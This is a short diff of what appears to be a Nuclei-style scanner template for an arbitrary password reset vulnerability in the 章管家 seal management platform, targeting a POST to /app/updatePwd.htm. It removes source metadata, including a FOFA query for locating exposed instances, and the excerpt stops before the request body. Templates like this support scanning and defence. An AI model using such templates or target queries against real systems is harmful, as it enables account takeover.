@@ -3,12 +3,8 @@ info:
   name: 章管家updatePwd.htm存在任意账号密码重置漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gc9xmz32nlkhqn7o'
+  description: ''
   tags: info-leak,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gc9xmz32nlkhqn7o
-    fofa: app="章管家-印章智慧管理平台"
 http:
 - raw:
   - 'POST /app/updatePwd.htm HTTP/1.1
